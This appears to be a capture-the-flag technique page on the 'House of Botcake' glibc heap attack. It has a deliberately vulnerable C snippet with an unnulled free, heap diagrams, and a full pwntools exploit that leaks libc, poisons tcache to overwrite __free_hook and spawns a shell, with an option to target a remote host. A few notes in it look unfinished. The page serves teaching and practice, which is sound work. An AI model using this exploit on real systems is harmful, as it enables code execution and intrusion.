---
title: "House of Botcake - Double Free Past the tcache Key"
category: pwn
subcategory: heap
type: technique
tags: [house-of-botcake, double-free, tcache, tcache-key, unsorted-bin, consolidation, chunk-overlap, uaf, tcache-poisoning, free-hook, pwndbg, gef, pwntools, glibc]
difficulty: medium
summary: "Free a chunk once into tcache and once through the consolidation path; the key check never sees the second free and you get an overlapping tcache chunk."
when_to_use:
  - "glibc 2.29+ and `free(): double free detected in tcache 2` blocks the naive double free"
  - "You have a double free but no edit primitive to clear the key"
  - "You want a tcache chunk that overlaps a live allocation"
  - "You need a clean, reliable primitive on 2.31 / 2.35 with minimal heap surgery"
tools: [pwntools, pwndbg, gef, one-gadget]
related: [heap-double-free, heap-tcache-key-bypass, heap-tcache-poisoning, heap-internals-primer, heap-write-targets]
---

## TL;DR

The tcache double-free detector only runs on the **tcache path** of `_int_free`. Fill
the bin to 7 so the next free skips that path entirely, free two adjacent chunks so
they consolidate in the unsorted bin, then free one of them *again* - this time it goes
to tcache. The result is a tcache entry that lives inside a larger free chunk you can
reallocate, i.e. an overlap, with every check satisfied.

## Recognise it

- glibc 2.29 - 2.39.
- You can free the same index twice, but `free(): double free detected in tcache 2`
  fires.
- No `edit()` on freed chunks (otherwise `heap-tcache-key-bypass` is simpler).
- Allocation sizes are tcache-eligible (0x20 - 0x410) and you can allocate at least 10
  chunks.

## Vulnerable code shape

```c
static char *ptr[16];

void do_free(void) {
    int i = read_idx();
    if (i < 0 || i >= 16) return;
    free(ptr[i]);          /* BUG: ptr[i] not NULLed -> double free available */
}

void do_alloc(void) {
    int i = read_idx();
    size_t n = read_size();
    ptr[i] = malloc(n);
    read(0, ptr[i], n);    /* write into freshly allocated memory */
}
```

## Theory

Targets: glibc 2.29 - 2.39.

### The two free paths

```c
/* _int_free */
size_t tc_idx = csize2tidx (size);
if (tcache != NULL && tc_idx < mp_.tcache_bins)
  {
    if (__glibc_unlikely (e->key == tcache_key))
      { /* scan the bin; abort if found */ }
    if (tcache->counts[tc_idx] < mp_.tcache_count)      /* < 7 */
      { tcache_put (p, tc_idx); return; }
  }
/* --- everything below is the "normal" path --- */
if (size <= get_max_fast ()) { ...fastbin... }
else { ...unsorted bin, with backward/forward consolidation... }
```

When `counts[tc_idx] == 7` the whole tcache block is skipped, **including the key
check**. The free then goes to the unsorted bin and consolidates with free neighbours.

### The trick

1. Saturate `tcache[idx]` with 7 chunks.
2. Allocate `prev` and `victim`, adjacent, both of that size.
3. `free(victim)` - tcache is full, so it goes to the **unsorted bin**.
4. `free(prev)` - also full, unsorted bin, and it **consolidates forward** with
   `victim`: one big free chunk now covers both.
5. Allocate one chunk of the tcache size - this *drains one slot* from tcache
   (`counts` 7 -> 6), so the bin now has room again.
6. `free(victim)` - `victim`'s address is still a valid-looking chunk pointer
   (its header is inside the consolidated chunk, untouched by consolidation because
   consolidation only rewrites the *merged* chunk's header at `prev`). tcache has room,
   so `tcache_put(victim)` runs. The key check does run - but `victim` is **not** in
   `tcache[idx]` (it went to the unsorted bin last time), so the scan finds nothing.
7. Now `victim` is in tcache **and** inside the big unsorted chunk.
8. Allocate a chunk large enough to carve the consolidated region
   (`prev_size + victim_size - 0x10`), which gives you a live chunk whose user data
   covers `victim`'s `next` pointer.
9. Write `victim->next = TARGET` through that live chunk.
10. Two mallocs of the tcache size: the first returns `victim`, the second returns
    `TARGET`.

Every check passes because at no point do you free a chunk that is already in the bin
you are freeing into.

### Canonical sizes (from how2heap)

- tcache filler / victim size: `0x100` chunks (request `0xF8`).
- The "big" reclaim request: `0x108` -> a `0x110` chunk? No: you need
  `prev(0x100) + victim(0x100) = 0x200` minus the 0x10 header, so request `0x1F0`
  (or anything that carves at least past `victim + 0x10`).

## Attack

glibc 2.31, chunk size 0x100 (request 0xF8):

1. `alloc(0..6, 0xF8)` - seven fillers.
2. `alloc(7, 0xF8)` -> `prev`
3. `alloc(8, 0xF8)` -> `victim`
4. `alloc(9, 0x18)` -> guard (keeps `victim` off the top chunk)
5. `free(0..6)` - `tcache[14]` is now 7/7.
6. `free(8)` (`victim`) - tcache full -> unsorted bin.
7. `free(7)` (`prev`) - tcache full -> unsorted bin, consolidates forward with
   `victim`. One 0x200 free chunk.
8. `alloc(10, 0xF8)` - takes one chunk back out of tcache. `counts[14]` = 6.
9. `free(8)` (`victim` again) - tcache has room; key check scans `tcache[14]` and does
   not find `victim`. `tcache_put(victim)`. **Double free achieved.**
10. `alloc(11, 0x1F8)` - carves the front of the 0x200 consolidated chunk. Its user
    data starts at `prev + 0x10` and extends past `victim + 0x10`.
11. `edit(11, b"\x00"*0xF0 + p64(TARGET))` - offset 0xF0 inside chunk 11's data is
    `victim + 0x10`, i.e. `victim->next`. (On 2.32+ mangle `TARGET`.)
12. `alloc(12, 0xF8)` - returns `victim`.
13. `alloc(13, 0xF8, payload)` - returns `TARGET`.

## Heap state

```text
step 1-4 layout

  F0..F6   7 x 0x100 fillers
  prev     0x100   (ptr[7])
  victim   0x100   (ptr[8])
  guard    0x20    (ptr[9])
  top

step 5: tcache[14] = F6 -> F5 -> ... -> F0   (counts = 7)

step 6: free(victim)
  counts[14] == 7  -> tcache block SKIPPED entirely (no key check)
  victim -> unsorted bin

step 7: free(prev)
  counts[14] == 7  -> skipped again
  prev's next chunk (victim) has PREV_INUSE clear -> FORWARD consolidation
  unsorted bin: one 0x200 chunk starting at `prev`

  prev   +0x000 | prev_size            |
         +0x008 | size = 0x201         |   <- the merged chunk
         +0x010 | fd = main_arena+0x60 |
         +0x018 | bk = main_arena+0x60 |
  victim +0x100 | (old header, stale)  |   <- still looks like a 0x100 chunk
         +0x110 | (old fd/bk)          |

step 8: alloc(0xf8) -> pops F6 out of tcache, counts[14] = 6

step 9: free(victim)   <-- the second free of the same address
  counts[14] == 6 < 7  -> tcache path taken
  e->key == tcache_key ?  yes (set when?) -> scan tcache[14]
     F5..F0 are there;  victim is NOT  -> no abort
  tcache_put(victim)

  tcache[14]: victim -> F5 -> F4 -> ...
  unsorted bin: the 0x200 chunk that CONTAINS victim

step 10-11: alloc(0x1f8) takes the 0x200 chunk

  chunk11 user = prev + 0x10 ... prev + 0x200
                                  ^ includes victim + 0x10 at offset 0xf0
  write TARGET there  ->  victim->next = TARGET

step 12-13
  malloc(0xf8) -> victim
  malloc(0xf8) -> TARGET
```

## Exploit

```python
#!/usr/bin/env python3
"""House of Botcake: a tcache double free that survives the 2.29 key check.

Target: glibc 2.29 - 2.39. Pass SAFELINK for 2.32+ (the next pointer is mangled).

Usage:
    ./exploit.py
    ./exploit.py SAFELINK
    ./exploit.py REMOTE HOST=1.2.3.4 PORT=1337
"""
from pwn import ELF, args, context, log, p64, process, remote, u64

BINARY = args.BIN or "./chal"
LIBC = args.LIBC or "./libc.so.6"

context.binary = ELF(BINARY, checksec=False)
context.log_level = args.LOG or "info"
libc = ELF(LIBC, checksec=False)

REQ = 0xF8          # -> 0x100 chunk, tcache index 14
BIG = 0x1F8         # -> 0x200 chunk: carves prev + victim in one go
VICTIM_OFF = 0xF0   # offset of victim->next inside the BIG chunk's user data

io = (remote(args.HOST or "127.0.0.1", int(args.PORT or 1337))
      if args.REMOTE else process([BINARY]))


def menu(c):
    io.sendlineafter(b"> ", str(c).encode())


def alloc(i, n, d=b"A"):
    menu(1)
    io.sendlineafter(b"index: ", str(i).encode())
    io.sendlineafter(b"size: ", str(n).encode())
    io.sendafter(b"content: ", d)


def free(i):
    menu(2)
    io.sendlineafter(b"index: ", str(i).encode())


def show(i):
    menu(3)
    io.sendlineafter(b"index: ", str(i).encode())
    io.recvuntil(b"content: ")
    return u64(io.recvline().rstrip(b"\n").ljust(8, b"\x00")[:8])


def edit(i, d):
    menu(4)
    io.sendlineafter(b"index: ", str(i).encode())
    io.sendafter(b"content: ", d)


def mangle(pos, ptr):
    return (pos >> 12) ^ ptr


def demangle(val):
    mask, key = 0xFFF << 52, 0
    for _ in range(5):
        key |= ((key ^ val) & mask) >> 12
        mask >>= 12
    return key ^ val


# ------------------------------------------------------------------ leaks
alloc(20, 0x418, b"leaker")
alloc(21, 0x18, b"guard0")
free(20)
libc.address = show(20) - 0x60 - libc.sym["main_arena"]
log.success("libc base = %#x", libc.address)

TARGET = libc.sym["__free_hook"] if "__free_hook" in libc.sym \
    else libc.sym["_IO_2_1_stdout_"]
log.info("target = %#x", TARGET)

# ------------------------------------------------------------- 1. the setup
for i in range(7):
    alloc(i, REQ, b"filler%d" % i)
alloc(7, REQ, b"prev")
alloc(8, REQ, b"victim")
alloc(9, 0x18, b"guard")

for i in range(7):
    free(i)                        # tcache[14] = 7/7
log.info("tcache[14] saturated")

# ------------------------------------------------ 2. consolidate prev+victim
free(8)                            # victim -> unsorted (tcache full, no key check)
free(7)                            # prev   -> unsorted, merges forward with victim
log.info("prev + victim consolidated into one 0x200 unsorted chunk")

# ------------------------------------------------- 3. make room, double free
alloc(10, REQ, b"drain")           # counts[14] 7 -> 6
free(8)                            # victim again: tcache path, key scan misses it
log.success("double free landed: victim is in tcache AND inside the big chunk")

# ------------------------------------------------ 4. reclaim and poison
alloc(11, BIG, b"C")               # takes the 0x200 chunk; covers victim's header

poison = TARGET
if args.SAFELINK:
    # victim's user address; read it once from the tcache with a show(), or
    # compute it from a heap leak.
    victim_user = demangle(show(8))
    log.info("victim user = %#x", victim_user)
    poison = mangle(victim_user, TARGET)

edit(11, b"\x00" * VICTIM_OFF + p64(poison))
log.info("victim->next -> %#x", TARGET)

# ---------------------------------------------------------- 5. cash out
alloc(12, REQ, b"consume victim")
alloc(13, REQ, p64(libc.sym["system"]))
log.success("write landed at %#x", TARGET)

alloc(14, 0x18, b"/bin/sh\x00")
free(14)
io.interactive()
```

## Variants & pitfalls

- **The guard chunk is mandatory.** Without it, `free(victim)` merges into the top
  chunk and there is nothing to double free.
- **Step 8 must remove exactly one entry.** If the program allocates internally
  (a `strdup` for your input), `counts` can drop further and the layout shifts.
  Check `pwndbg tcache` after every step while developing.
- **`free(): invalid pointer`** on step 9 means `victim`'s header was overwritten by
  the consolidation. It should not be - consolidation rewrites only the merged chunk's
  header at `prev` - but a `calloc` or an unrelated allocation in between can reuse the
  region.
- **2.32+ safe-linking**: `victim->next` must be mangled with `victim`'s own user
  address. You get that address from `show(8)` (the tcache entry) via `demangle()`.
- **Size choice.** Any tcache-eligible size works as long as `prev` and `victim` are
  adjacent and the merged size is not itself tcache-eligible in a way that changes the
  path. 0x100 is the canonical choice.
- **Compare with `heap-tcache-key-bypass`.** If you *can* edit a freed chunk, clearing
  the key is two lines instead of thirteen. Botcake is for when you cannot.
- **2.34+**: `counts[tc_idx] > 0` is checked on the malloc side, and the target must be
  16-byte aligned. Both are satisfied by this flow.

## Debugging

```text
pwndbg> tcache                      # counts[14] after every step is the ground truth
pwndbg> bins
pwndbg> vis_heap_chunks 30
pwndbg> x/4gx <victim_chunk>        # header survives the consolidation
pwndbg> try_free <victim_chunk>     # before step 9: should say "tcache" not "abort"
pwndbg> p tcache->counts[14]
gef>  heap bins tcache
```

```bash
# Confirm the key check exists (2.29+) - otherwise use the plain tcache dup.
strings ./libc.so.6 | grep -c "double free detected in tcache 2"
```

## Tools

- `pwndbg tcache` / `try_free`.
- `how2heap house_of_botcake.c` - the reference implementation.
- `one_gadget` for the payoff.

## References

- shellphish `how2heap`: `house_of_botcake.c`.
- glibc `malloc/malloc.c`: `_int_free` tcache branch and consolidation.
